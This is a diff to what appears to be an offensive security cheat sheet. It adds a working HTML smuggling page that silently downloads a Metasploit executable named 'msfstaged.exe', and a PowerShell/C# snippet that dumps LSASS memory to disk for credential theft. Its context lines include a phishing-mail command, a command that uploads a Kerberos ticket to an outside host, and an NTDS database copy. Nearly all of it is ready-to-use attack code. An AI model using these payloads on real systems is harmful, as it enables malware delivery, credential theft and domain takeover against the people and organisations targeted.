@@ -508,6 +508,38 @@ if (Object.Status == 200)
 var r = new ActiveXObject("WScript.Shell").Run("pay.exe");
 ```
 ---
+### HTML Smuggling
+```html
+<html>
+ <body>
+ <script>
+ function base64ToArrayBuffer(base64) {
+ var binary_string = window.atob(base64);
+ var len = binary_string.length;
+ var bytes = new Uint8Array( len );
+ for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i);
+}
+ return bytes.buffer;
+}
+
+ var file ='<base64 exe>'
+ var data = base64ToArrayBuffer(file);
+ var blob = new Blob([data], {type: 'octet/stream'});
+ var fileName = 'msfstaged.exe';
+
+ var a = document.createElement('a');
+ document.body.appendChild(a);
+ a.style = 'display: none';
+ var url = window.URL.createObjectURL(blob);
+ a.href = url;
+ a.download = fileName;
+ a.click();
+ window.URL.revokeObjectURL(url);
+ </script>
+ </body>
+</html>
+```
+---
 ### Send mail with swaks
 ```
 swaks --to support@domain.local --from "test@test.com" --header "Subject: Internal web app" --body "http://10.10.14.99:8000/" --server 192.168.13.14 --attach-type application/pdf --attach=file1.pdf
@@ -812,6 +844,72 @@ Invoke-WebRequest -uri http://10.10.15.51:8080/ldap.kirbi -Method Put -Infile ld
 ### Local DCSYNC
 ```
 ntdsutil.exe 'ac i ntds' 'ifm' 'create full $env:TEMP' q q
+```
+
+### LSASS DUMP
+```powershell
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+public class MiniDump {
+    [Flags]
+    public enum Option : uint {
+        Normal = 0x00000000,
+        WithDataSegs = 0x00000001,
+        WithFullMemory = 0x00000002,
+        WithHandleData = 0x00000004,
+        FilterMemory = 0x00000008,
+        ScanMemory = 0x00000010,
+        WithUnloadedModules = 0x00000020,
+        WithIndirectlyReferencedMemory = 0x00000040,
+        FilterModulePaths = 0x00000080,
+        WithProcessThreadData = 0x00000100,
+        WithPrivateReadWriteMemory = 0x00000200,
+        WithoutOptionalData = 0x00000400,
+        WithFullMemoryInfo = 0x00000800,
+        WithThreadInfo = 0x00001000,
+        WithCodeSegs = 0x00002000,
+        WithoutAuxiliaryState = 0x00004000,
+        WithFullAuxiliaryState = 0x00008000,
+        WithPrivateWriteCopyMemory = 0x00010000,
+        IgnoreInaccessibleMemory = 0x00020000,
+        ValidTypeFlags = 0x0003ffff,
+    }
+
+    [DllImport("Dbghelp.dll")]
+    private static extern bool MiniDumpWriteDump(
+        IntPtr hProcess,
+        uint processId,
+        IntPtr hFile,
+        Option dumpType,
+        IntPtr exceptionParam,
+        IntPtr userStreamParam,
+        IntPtr callbackParam
+    );
+
+    public static void Dump(string path, int processId) {
+        using (Process process = Process.GetProcessById(processId)) {
+            using (var fileStream = new System.IO.FileStream(path, System.IO.FileMode.Create)) {
+                MiniDumpWriteDump(
+                    process.Handle,
+                    (uint)processId,
+                    fileStream.SafeFileHandle.DangerousGetHandle(),
+                    Option.WithFullMemory,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    IntPtr.Zero
+                );
+            }
+        }
+    }
+}
+"@
+
+$dumpPath = "C:\users\public\test123.txt"
+$abcd = Get-Process lsass
+[MiniDump]::Dump($dumpPath, $abcd.Id)
 ```
 
 
